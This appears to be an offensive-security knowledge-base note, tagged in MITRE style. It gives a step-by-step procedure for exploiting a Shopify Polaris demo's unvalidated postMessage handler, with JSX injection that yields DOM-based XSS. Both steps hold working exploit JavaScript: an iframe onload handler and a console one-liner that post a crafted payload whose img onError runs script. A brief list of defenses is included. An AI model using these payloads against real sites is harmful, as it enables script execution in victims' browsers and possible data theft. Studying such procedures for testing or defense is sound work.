---
tags:
  - xss
  - postmessage
  - jsx
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/send-malicious-postmessage]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 95af74de-cf4b-45cf-9c09-3fd6ebff5ce1
created_at: '2025-12-14T03:16:02.498Z'
updated_at: '2025-12-14T03:16:02.498Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Send-Malicious-postMessage-Payload

## Summary

This procedure sends a crafted postMessage to the embedded Shopify Polaris demo iframe, exploiting the unvalidated handleMessage function to inject malicious JSX that executes arbitrary JavaScript, such as alerting the document location.

## Description

After embedding the demo, this procedure uses the iframe's onload event to dispatch a postMessage with a payload structured as {ast: {code: "malicious JSX"}}. The demo's React component processes this without sanitization, rendering the JSX and triggering events like onError to run JS. This is a DOM-based XSS targeting the victim's browser session on the demo's domain. Prerequisites include the embedded iframe from the prior procedure. Outcomes include code execution, potentially for data theft.

## Requirements

1. Successfully embedded iframe from previous procedure
2. Modern web browser supporting postMessage API
3. Basic JavaScript knowledge for payload crafting

## Defense

Defensive measures and detection strategies:

- Sanitize all user-controlled inputs to React state, especially JSX/code
- Restrict postMessage origins to trusted sources only
- Use browser extensions or WAF to block suspicious postMessage patterns

## Objectives

1. Inject and render malicious JSX in the demo's React component
2. Execute arbitrary JavaScript in the iframe context
3. Demonstrate impact like URL disclosure

## Instructions

### Step 1: Attach Onload Handler

**Context**: Add a script to the HTML that waits for the iframe to load before sending the message.

**Command** ([[commands/send-malicious-postmessage]]):
```javascript
const ifrm = document.getElementById('ifrm');
ifrm.onload = function() {
  ifrm.contentWindow.postMessage({
    ast: {
      code: "<img src='x' onError={() => alert(document.location)} />;"
    }
  }, '*');
};
```

> Append this to the <script> tag in exploit.html. The '*' targetOrigin allows sending from any origin.

### Step 2: Trigger and Verify Execution

**Context**: Reload the malicious page to fire the onload and observe the XSS.

**Command** (Manual execution via browser):
```javascript
// Paste into browser console after loading for direct test
ifrm.contentWindow.postMessage({ast:{code:"<img src='x' onError={() => alert(document.location)} />;"}},'*');
```

> Expected: Alert shows the demo's URL. Inspect demo's React state for injected code.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/send-malicious-postmessage]]

## Tools Used


## Tags

- [[xss]]
- [[postmessage]]
- [[jsx]]
